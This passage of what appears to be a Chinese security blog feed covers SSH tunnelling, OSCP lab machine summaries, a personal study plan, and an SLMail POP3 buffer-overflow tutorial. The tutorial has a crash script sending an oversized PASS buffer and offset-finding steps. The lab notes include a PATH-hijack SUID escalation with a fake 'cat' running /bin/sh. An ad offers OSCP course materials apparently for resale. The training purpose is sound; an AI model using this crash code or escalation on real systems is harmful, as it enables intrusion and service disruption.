alt="3"></p><p>在目录下直接打开hashcat.potfile，就可以看到密码了。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-31-11/4.PNG" alt="4"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssh端口转发</title>
    <link href="/2019/12/25/07-x/"/>
    <url>/2019/12/25/07-x/</url>
    
    <content type="html"><![CDATA[<h1 id="ssh端口转发"><a href="#ssh端口转发" class="headerlink" title="ssh端口转发"></a>ssh端口转发</h1><p>参考资料：</p><ul><li><a href="https://www.ssh.com/ssh/tunneling/example#remote-forwarding">https://www.ssh.com/ssh/tunneling/example#remote-forwarding</a></li></ul><h2 id="修改VPS-ssh配置"><a href="#修改VPS-ssh配置" class="headerlink" title="修改VPS ssh配置"></a>修改VPS ssh配置</h2><p><code>vi /etc/ssh/sshd_config</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-25-07/1.PNG" alt="1"><br>与portForwarding相关的都改为yes.</p><h2 id="本地端口转发LPF"><a href="#本地端口转发LPF" class="headerlink" title="本地端口转发LPF"></a>本地端口转发LPF</h2><p>当本地不能直接连接外部服务的时候，使用LPF</p><h3 id="案例一：两个机器"><a href="#案例一：两个机器" class="headerlink" title="案例一：两个机器"></a>案例一：两个机器</h3><figure class="highlight diff"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs diff"><span class="hljs-deletion">-f 后台启用</span><br><span class="hljs-deletion">-g 启用网关功能</span><br><span class="hljs-deletion">-N 不打开远程shell，处于等待状态</span><br><br>ssh -fgN -L 9000:127.0.0.1:80 root@VPS <br>这条命令中，使用的IP和端口含义如下<br><br>本地：127.0.0.1:9000<br>远程：VPS:80<br>一旦连接成功，访问以上两个地址效果相等。<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-25-07/2.PNG" alt="2"></p><p>访问本地地址 = 访问（原先访问不了的）外网地址</p><h3 id="案例二：三个机器"><a href="#案例二：三个机器" class="headerlink" title="案例二：三个机器"></a>案例二：三个机器</h3><figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns">ssh -fgN -L <span class="hljs-number">9000:211.103</span>.<span class="hljs-number">214.132:80</span> root@VPS<br><br>该命令跟上一个案例不同的地方在于，从本地<span class="hljs-number">127.0.0.1</span>修改为了远程地址<span class="hljs-number">211.103.214.132</span><br><br>本地：<span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9000</span><br>远程：<span class="hljs-number">211.103.214.132</span>:<span class="hljs-number">80</span><br>VPS: 做代理使用，使用<span class="hljs-number">22</span>端口<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-25-07/3.PNG" alt="3"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>只能使用IP，不能使用域名指代地址<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-25-07/4.PNG" alt="4"></p><h2 id="远程端口转发RPF"><a href="#远程端口转发RPF" class="headerlink" title="远程端口转发RPF"></a>远程端口转发RPF</h2><p>当外网访问不了本地的服务的时候，使用RPF</p><h3 id="案例一："><a href="#案例一：" class="headerlink" title="案例一："></a>案例一：</h3><p>首先，本地开启一个web服务</p><figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns">python -m SimpleHTTPServer <span class="hljs-number">889</span><br><br>ssh -fgN -R <span class="hljs-number">9000:127.0</span>.<span class="hljs-number">0.1:889</span> root@VPS<br><br>本地：<span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">889</span><br>远程：VPS:<span class="hljs-number">9000</span><br><br>访问外网地址 = 访问（原先访问不了的）内网地址<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-25-07/6.PNG" alt="6"></p><h2 id="动态端口转发DPF"><a href="#动态端口转发DPF" class="headerlink" title="动态端口转发DPF"></a>动态端口转发DPF</h2><p>我们拥有一个内网机器A的root权限，可以通过DPF，是的机器A作为我们的跳板机，可以成功访问内网其他机器。</p><p>ssh -fgN -D 本地代理端口888 -p ssh端口 目标ip</p><p>本地配置浏览器代理，127.0.0.1，端口设置为本地代理端口888（设置为本地未使用的任意端口）</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-25-07/5.PNG" alt="5"></p><p>即可访问通过本地代理端口，访问内网主机</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul><li>本地端口转发和远程端口转发有什么区别？</li></ul><blockquote><p>前者是内网访问不了外网等情况，一旦连接成功，访问<strong>本地端口</strong>即可。<br>后者是外网访问不了内网的情况，一旦连接成功，访问<strong>外网端口</strong>即可。<br>（=。=）<br>要选择哪种端口转发方式，要取决于要访问哪个服务，不能访问外网的服务，用本地端口转发；不能访问内网的服务，使用远程端口转发。</p></blockquote><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>killall -KILL sshd<br>一条命令关闭所有打开的ssh连接</p>]]></content>
    
    
    <categories>
      
      <category>oscp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>oscp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssh允许密码登陆</title>
    <link href="/2019/12/24/04-x/"/>
    <url>/2019/12/24/04-x/</url>
    
    <content type="html"><![CDATA[<p>ubuntu因为安全机制，只允许密钥文件登入，现在修改为允许密码登入。</p><h2 id="1，允许密码登入"><a href="#1，允许密码登入" class="headerlink" title="1，允许密码登入"></a>1，允许密码登入</h2><p>sudo vi /etc/ssh/sshd_config</p><p>找到passwordAuthentication项，修改成yes<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-24-04/10.PNG" alt="10"></p><h2 id="2，允许root登入"><a href="#2，允许root登入" class="headerlink" title="2，允许root登入"></a>2，允许root登入</h2><p>继续修改sshd_config文件</p><p>找到并用**#注释<strong>掉这行：</strong>PermitRootLogin prohibit-password**</p><p>新建一行 <strong>添加</strong>：<strong>PermitRootLogin yes</strong></p><h2 id="3，修改root密码（强密码）"><a href="#3，修改root密码（强密码）" class="headerlink" title="3，修改root密码（强密码）"></a>3，修改root密码（强密码）</h2><p>passwd root</p><p>输入强密码</p><h2 id="4，重启服务"><a href="#4，重启服务" class="headerlink" title="4，重启服务"></a>4，重启服务</h2><p><strong>#sudo service ssh restart</strong></p><p>不需要重启计算机，即可远程登入</p>]]></content>
    
    
    <categories>
      
      <category>problem</category>
      
    </categories>
    
    
    <tags>
      
      <tag>problem</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>masscan扫描结束后不返回结果</title>
    <link href="/2019/12/21/11-x/"/>
    <url>/2019/12/21/11-x/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/robertdavidgraham/masscan/issues/144">https://github.com/robertdavidgraham/masscan/issues/144</a></p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">masscan --<span class="hljs-keyword">version</span><br><br>Masscan <span class="hljs-keyword">version</span> <span class="hljs-number">1.0</span>.<span class="hljs-number">5</span><br>---<br>apt-<span class="hljs-built_in">get</span> -<span class="hljs-keyword">y</span> <span class="hljs-built_in">remove</span> masscan<br>$git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/robertdavidgraham/masscan<br>$ <span class="hljs-keyword">cd</span> masscan<br>$ <span class="hljs-keyword">make</span><br><span class="hljs-keyword">cp</span> bin/masscan /usr/bin/masscan<br>masscan --<span class="hljs-keyword">version</span><br>Masscan <span class="hljs-keyword">version</span> <span class="hljs-number">1.0</span>.<span class="hljs-number">6</span> <br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>problem</category>
      
    </categories>
    
    
    <tags>
      
      <tag>problem</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OSCP考核复习资料</title>
    <link href="/2019/12/17/03-x/"/>
    <url>/2019/12/17/03-x/</url>
    
    <content type="html"><![CDATA[<p>OSCP考核复习资料（网络安全）<br>Offensive Security Certified Professional考试</p><p>视频教程+PDF书籍</p><p>PDF书籍</p><ol><li>官方PDF 375页 （英文PDF）</li><li>oscp考试认证指南 中文版+英文版</li><li>Penetration Testing——A Hands-On Introduction to Hacking<br>作者Georgia Weidman</li><li>The-Hacker-Playbook-Practical-Guide-To-Penetration-Testing-2014</li><li>漏洞利用与提权 ( 赠送 )</li></ol><p>视频资料：</p><ul><li>INE - OSCP Security Technology Course<br>共14章，2.85GB</li><li>kali 渗透测试视频 70.71 GB</li></ul><p>这是一个广告，购买<a href="https://market.m.taobao.com/app/idleFish-F2e/widle-taobao-rax/page-detail?wh_weex=true&wx_navbar_transparent=true&id=609745104966&ut_sk=1.W8/lRTdqkP8DAINtC46VjcuH_12431167_1576566525803.Copy.detail.609745104966.2609790715&forceFlush=1">点我</a></p>]]></content>
    
    
    <categories>
      
      <category>advertisement</category>
      
    </categories>
    
    
    <tags>
      
      <tag>advertisement</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>slmail&amp;windows缓冲区溢出案例（一）</title>
    <link href="/2019/12/13/08-x/"/>
    <url>/2019/12/13/08-x/</url>
    
    <content type="html"><![CDATA[<h1 id="缓冲区溢出案例与exp开发流程"><a href="#缓冲区溢出案例与exp开发流程" class="headerlink" title="缓冲区溢出案例与exp开发流程"></a>缓冲区溢出案例与exp开发流程</h1><ul><li>bug是怎么找到的?</li><li>你怎么知道x比特在y命令，可以使应用程序崩溃造成缓冲区溢出漏洞？</li></ul><p>有三种方法：</p><ol><li>如果有源代码，阅读源码是最简单的寻找bug的方式。</li><li>逆向工程</li><li>fuzzing</li></ol><hr><p>fuzzing 是一种向应用程序发送构造的数据，然后期盼程序崩溃。<br>程序崩溃说明程序没有对输入做正确的过滤。</p><h2 id="漏洞历史"><a href="#漏洞历史" class="headerlink" title="漏洞历史"></a>漏洞历史</h2><p>下面讲一下在slmail 5.5.0 邮件服务软件上的知名缓冲区溢出漏洞。<br>在2005年发现，pop3 pass命令，在用户登陆的时候，有bof漏洞。攻击者无需知道<br>任何口令即可引发bof漏洞。<br>该软件未使用DEP或者ASLR编译，使得漏洞利用过程更加简单，我们不必绕过这些内部安全机制。</p><h2 id="DEP和ASLR"><a href="#DEP和ASLR" class="headerlink" title="DEP和ASLR"></a>DEP和ASLR</h2><p>这是微软的内存保护机制。<br>DEP是一系列硬件、软件技术，执行额外的内存检查，防止恶意代码在程序上运行。<br>DEP主要的好处是当发生异常时，防止代码从数据区执行。<br>ASLR打乱载入应用程序、动态链接库时候的基地址（base address)</p><h2 id="与pop3协议通信"><a href="#与pop3协议通信" class="headerlink" title="与pop3协议通信"></a>与pop3协议通信</h2><p>我们选择slmail作为案例的原因是，与纯文本pop3协议通信十分简单。<br>我们可以使用netcat与pop3服务器进行通信。</p><p><a href="https://slmail.software.informer.com/5.5/">https://slmail.software.informer.com/5.5/</a><br>安装exe到windows，重启后，windows开放了pop3-110端口 </p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/16.PNG" alt="16"></p><h2 id="写一个python脚本"><a href="#写一个python脚本" class="headerlink" title="写一个python脚本"></a>写一个python脚本</h2><p>这个脚本的作用很简单，和nc起到的作用一样。为什么要写这个脚本呢?因为根据这个脚本稍作修改，就可以改为fuzzer脚本，使得应用程序崩溃。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/15.PNG" alt="15"></p><p><a href="https://github.com/Whale3070/ctf-coding/blob/master/send.py">https://github.com/Whale3070/ctf-coding/blob/master/send.py</a></p><p><a href="https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py">https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py</a></p><h2 id="immunity-debugger"><a href="#immunity-debugger" class="headerlink" title="immunity debugger"></a>immunity debugger</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/18.PNG" alt="18"></p><p>左上 –指令面板</p><p>右上 –寄存器面板</p><p>左下 –内存转储面板</p><p>右下 –堆栈面板</p><hr><p>file – attach –SLmail<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/17.PNG" alt="17"></p><p>挂载后，点击下图的开始按钮，运行程序<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/20.PNG" alt="20"></p><p>运行<a href="https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py">fuzzer.py</a>，使程序崩溃，造成了缓冲区溢出</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/19.PNG" alt="19"></p><h2 id="定位缓冲区大小"><a href="#定位缓冲区大小" class="headerlink" title="定位缓冲区大小"></a>定位缓冲区大小</h2><p>定位缓冲区大小，当输入2500个a，程序运行正常；输入2600个a时候，就会报错。</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python</span><br>import socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>buffer= <span class="hljs-string">&#x27;a&#x27;</span> * 2700<br>try:<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;\nSending evil buffer...&quot;</span><br>s.connect((<span class="hljs-string">&#x27;192.168.1.102&#x27;</span>,110)) # connect <span class="hljs-keyword">to</span> IP, POP3<span class="hljs-built_in"> port</span><br><span class="hljs-built_in"></span>data = s.recv(1024) # receive banner<br><span class="hljs-builtin-name">print</span> data # <span class="hljs-builtin-name">print</span> banner<br><br>s.send(<span class="hljs-string">&#x27;USER test&#x27;</span> +<span class="hljs-string">&#x27;\r\n&#x27;</span>) # send username <span class="hljs-string">&quot;test&quot;</span><br>data = s.recv(1024) # receive reply<br><span class="hljs-builtin-name">print</span> data # <span class="hljs-builtin-name">print</span> reply<br><br>s.send(<span class="hljs-string">&#x27;PASS&#x27;</span> + buffer + <span class="hljs-string">&#x27;\r\n&#x27;</span>) # send password <span class="hljs-string">&quot;test&quot;</span><br>data = s.recv(1024)<br><span class="hljs-builtin-name">print</span> data # <span class="hljs-builtin-name">print</span> reply<br><br>s.close() # close socket<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;\nDone!&quot;</span><br>except:<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;Could not connect to POP3!&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="控制eip"><a href="#控制eip" class="headerlink" title="控制eip"></a>控制eip</h2><p>控制eip寄存器是exp开发流程中关键的有，eip寄存器就像驾驭马的辔头一样，控制缰绳就让应用程序前进，<br>拉着缰绳就能让它改变前进方向。所以我们使用4个A在buffer(缓冲区)中覆盖了EIP，这里有两个常见的方法：</p><h3 id="二叉树分析"><a href="#二叉树分析" class="headerlink" title="二叉树分析"></a>二叉树分析</h3><p>将2700个A修改为，发送1350A和1350个B，如果EIP被B所覆盖，我们知道了4比特存在于buffer的第二部分。<br>接下来，修改1350个B为675个B和675个C，然后再一次发送buffer。<br>如果EIP被C覆盖，我们知道了4bit存在于2000-2700比特范围之间。<br>我们继续将buffer二分直到我们知道了准确的覆盖EIP的4bit。<br>从数学上来说，这将在7次之内找到。</p><h3 id="发送一个特殊的字符串-使用msf）"><a href="#发送一个特殊的字符串-使用msf）" class="headerlink" title="发送一个特殊的字符串(使用msf）"></a>发送一个特殊的字符串(使用msf）</h3><p>最快的方式是发送一个特殊的字符，来确认覆盖EIP的范围，然后在buffer中查找这个字符。</p><p><strong>patter_create.rb</strong></p><p>是一个ruby工具，来创建和定位这样的buffer，并且可以在msf中找到它。<br>使用方法：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">locate pattern_create<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_create.rb -l <span class="hljs-number">2700</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/21.PNG" alt="21"></p><p>复制生成的字符串，修改<a href="https://github.com/Whale3070/ctf-coding/blob/master/send.py">send.py</a>，将字符串作为pass密码发送，而不是2700个A，注意下一次程序崩溃时，ESP和EIP寄存器中的值</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/22.PNG" alt="22"></p><p>执行send3py</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/23.PNG" alt="23">注意弹框的地址<code>39694438</code></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">locate pattern_offset.rb<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_offset.rb -l <span class="hljs-number">2700</span> -q <span class="hljs-number">39694438</span><br><br>[*] Exact match at offset <span class="hljs-number">2606</span><br></code></pre></div></td></tr></table></figure><p>于是得知了offset为2606</p><h2 id="检查buffer，准备执行shellcode"><a href="#检查buffer，准备执行shellcode" class="headerlink" title="检查buffer，准备执行shellcode"></a>检查buffer，准备执行shellcode</h2><p>msf可以自动生成shellcode，标准的反弹shell的payload（有效载荷）需要大约350-400比特的空间。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-13-08/24.PNG" alt="24"><br>修改buffer，<code>string= &quot;A&quot;* 2606+ &quot;B&quot;*4 + &quot;C&quot;*(3500-2606-4)</code><br>查看最后的crash，我们可以看到ESP寄存器直接指向了我们缓冲区的C地址，这看起来有足够的空间让我们放置shellcode。</p>]]></content>
    
    
    <categories>
      
      <category>buffer overflow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OSCP-like linux VMs</title>
    <link href="/2019/12/12/07-x/"/>
    <url>/2019/12/12/07-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：</p><ul><li><a href="https://github.com/ferreirasc/oscp">https://github.com/ferreirasc/oscp</a></li></ul><hr><h2 id="Kioptrix-Level-1-1"><a href="#Kioptrix-Level-1-1" class="headerlink" title="Kioptrix: Level 1 (#1)"></a>Kioptrix: Level 1 (#1)</h2><p><a href="https://whale3070.github.io/training/2017/10/01/kiotrix%E9%9D%B6%E6%9C%BA-139%E7%AB%AF%E5%8F%A3samba/">writeup</a></p><p>渗透思路：samba版本漏洞，远程缓冲区溢出，使用msf to root</p><h2 id="Kioptrix-Level-1-1-2"><a href="#Kioptrix-Level-1-1-2" class="headerlink" title="Kioptrix: Level 1.1 (#2)"></a>Kioptrix: Level 1.1 (#2)</h2><p><a href="https://whale3070.github.io/training/2017/11/01/kioptrix-level-2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">writeup 上</a></p><p><a href="https://whale3070.github.io/training/2017/11/01/level-2-nc%E4%B8%8E%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">writeup 下</a></p><p>渗透思路：linux + web 远程命令执行漏洞，获得shell。linux内核漏洞提权。</p><h2 id="Kioptrix-Level-1-2-3"><a href="#Kioptrix-Level-1-2-3" class="headerlink" title="Kioptrix: Level 1.2 (#3)"></a>Kioptrix: Level 1.2 (#3)</h2><p><a href="https://whale3070.github.io/training/2017/11/02/%E8%BF%98%E6%98%AFkioptrix-LFI%E4%B8%8E%E6%B3%A8%E5%85%A5/">writeup 上</a></p><p><a href="https://whale3070.github.io/training/2017/11/01/level-3-%E4%B8%8B%E9%9B%86-wget%E4%B8%8E%E6%8F%90%E6%9D%83/">writeup下</a></p><p>渗透思路：linux + web eval函数代码注入，有msf exp可用，直接获取root权限。<br>或者sql报错注入，ssh登陆，上传msf载荷，meterpreter提权。</p><h2 id="Kioptrix-Level-1-3-4"><a href="#Kioptrix-Level-1-3-4" class="headerlink" title="Kioptrix: Level 1.3 (#4)"></a>Kioptrix: Level 1.3 (#4)</h2><p><a href="https://whale3070.github.io/training/2017/11/01/level-4-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">writeup</a></p><p>渗透思路：布尔盲注获得用户名密码，ssh登陆，mysql高权限执行系统命令提权</p><h2 id="FristiLeaks-1-3"><a href="#FristiLeaks-1-3" class="headerlink" title="FristiLeaks: 1.3"></a>FristiLeaks: 1.3</h2><p><a href="https://whale3070.github.io/training/2017/12/01/FristiLeaks-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">writeup</a></p><p>渗透思路：找到源码中隐藏的用户密码，文件上传漏洞拿webshell +dirtycow漏洞提权。</p><h2 id="PwnLab-init"><a href="#PwnLab-init" class="headerlink" title="PwnLab: init"></a>PwnLab: init</h2><p><a href="https://whale3070.github.io/training/2017/11/04/Pwnlab-LFI-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%B8%8A%E4%BC%A0/">writeup</a></p><p>渗透思路：web文件包含漏洞，php伪协议查看web源码。通过上传功能上传jpg后缀的webshell，用文件包含漏洞执行该webshell</p><p>提权方式与这篇<a href="https://whale3070.github.io/training/2019/03/09/x/">文章</a>类似，<br>找到了suid权限的程序msgmike，运行该程序，并且使用strings命令，可以得知该程序调用了cat命令。</p><p>于是操纵环境变量，以本地目录开始查找cat，并且伪造一个cat命令。</p><p><code>echo &quot;/bin/sh&quot; &gt; cat</code></p><p><code>chmod +x cat</code><br>于是运行该suid权限的程序，就会运行伪造的cat命令，调用了/bin/sh。使用这种方法提权。</p><h2 id="Pluck-1"><a href="#Pluck-1" class="headerlink" title="Pluck: 1"></a>Pluck: 1</h2><p><a href="https://whale3070.github.io/training/2019/12/08/11-x/">writeup</a></p><p>渗透思路：web文件包含漏洞，查看备份文档，获取ssh登陆密钥获得shell。dirty cow linux漏洞获取最高权限。</p><h2 id="省略没做的机器"><a href="#省略没做的机器" class="headerlink" title="省略没做的机器"></a>省略没做的机器</h2><p>以下两个机器因为时间紧张，简单难度的就不做了。</p><ul><li>  W1R3S: 1.0.1 </li><li>  Stapler: 1 </li></ul><h2 id="Kioptrix-2014"><a href="#Kioptrix-2014" class="headerlink" title="Kioptrix: 2014"></a>Kioptrix: 2014</h2><p><a href="https://whale3070.github.io/training/2017/11/02/kioptrix-2014-level-5-LFI%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/">writeup</a>看了一眼17年写的wp，惨不忍睹简直想删。。太菜了</p><p><a href="https://whale3070.github.io/training/2019/12/09/04-x/">writeup2019</a></p><p>渗透思路：目录遍历获取敏感信息，修改浏览器头文件，进入8080端口。web exp执行获得web权限；linux内核exp执行获得root权限。</p><h2 id="Mr-Robot-1"><a href="#Mr-Robot-1" class="headerlink" title="Mr-Robot: 1"></a>Mr-Robot: 1</h2><p><a href="https://whale3070.github.io/training/2017/12/02/mr-robot-%E7%88%86%E7%A0%B4%E5%90%8E%E5%8F%B0+SUID%E6%8F%90%E6%9D%83/">writeup</a></p><p>渗透思路：wordpress cms爆破后台，弱密码登陆web后台，登陆后修改404页面的php文件，替换为php reverse shell。suid程序nmap提权。</p><h2 id="HackLAB-Vulnix"><a href="#HackLAB-Vulnix" class="headerlink" title="HackLAB: Vulnix"></a>HackLAB: Vulnix</h2><p><a href="https://whale3070.github.io/training/2017/12/03/NFS%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-smtp%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86+ssh%E7%88%86%E7%A0%B4/">writeup 上</a></p><p><a href="https://whale3070.github.io/2017/12/04/Vulnix-nfs%E6%8F%90%E6%9D%83/">writeup 下</a></p><p>渗透思路：smtp泄露用户名，结合ssh爆破弱密码获得shell。nsf提权，参考<a href="https://whale3070.github.io/oscp/2019/12/06/02-x/">这篇OutOfBox机器</a>，已经讲过了。</p><h2 id="uncompleted"><a href="#uncompleted" class="headerlink" title="uncompleted"></a>uncompleted</h2><p>Brainpan: 1 (Part 1 of BO is relevant to OSCP. egghunting is out of scope though)</p><ul><li>  Not so sure (Didn’t solve them yet):</li><li>  VulnOS: 2 [ok]</li><li>  SickOs: 1.2 [ok]</li><li>  /dev/random: scream</li><li>  pWnOS: 2.0</li><li>  SkyTower: 1</li><li>  IMF</li><li>  Lord of the Root 1.0.1 [ok]</li><li>  Tr0ll</li><li>  Pegasus</li><li>  SkyTower [ok]</li></ul>]]></content>
    
    
    <categories>
      
      <category>oscp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>oscp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020年学习计划</title>
    <link href="/2019/12/11/02-x/"/>
    <url>/2019/12/11/02-x/</url>
    
    <content type="html"><![CDATA[<p>一转眼一年就过去了，去年春节的事情还历历在目，就好像昨天发生的事情一样。今年一直很焦虑，担心一些很小的事情。大三上学期4月的时候担心毛概老师要是不给我过怎么办，6月末担心英语6级没有考过怎么办？暑假实习做ctf培训备课，很紧张担心万一出问题了怎么办？9月大四上学期，秋招找不到工作怎么办？</p><p>结果担心的事情一件也没有发生。</p><p>今年就在上课、实习、写作业、写渗透报告，等等杂七杂八的事情中过去了。学到最多的，还是自己静下心来想学点东西的时候。</p><p>在绿盟还各个安全公司做安全服务，大概就是这样的感觉。就像《工作细胞》里的白细胞一样，跑到各个甲方公司去做渗透测试（找bug）等各种项目。</p><p>但帮助最大的还是对网络安全行业盈利方式有了个直观的了解，这是在学校里所体会不到的经验。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-11-02/20191211135945.jpg"></p><h2 id="职业发展方向"><a href="#职业发展方向" class="headerlink" title="职业发展方向"></a>职业发展方向</h2><p>安全服务工程师，对各种知识的要求都不高；驻场工程师，要求更低。不客气地说，都可以叫扫描器工程师（=/_=）</p><figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica">工作难度，<span class="hljs-number">1</span>颗星；<br>工资水平，<span class="hljs-number">2019</span>年（<span class="hljs-number">8</span><span class="hljs-built_in">K</span> <span class="hljs-operator">+</span> ）；<br>工作舒适度，<span class="hljs-number">5</span>颗星；<br>工作易被取代程度，<span class="hljs-number">3</span>颗星。<br></code></pre></div></td></tr></table></figure><p>顺便把第一份实习ichunqiu课程内容部的实习也打个分吧</p><figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica">工作难度，<span class="hljs-number">0.5</span>颗星；<br>工资水平，<span class="hljs-number">2018</span>年（<span class="hljs-number">4</span><span class="hljs-built_in">K</span> <span class="hljs-operator">+</span> ）；<br>工作舒适度，<span class="hljs-number">3</span>颗星；<br>工作易被取代程度，<span class="hljs-number">5</span>颗星。<br></code></pre></div></td></tr></table></figure><h2 id="是否读研"><a href="#是否读研" class="headerlink" 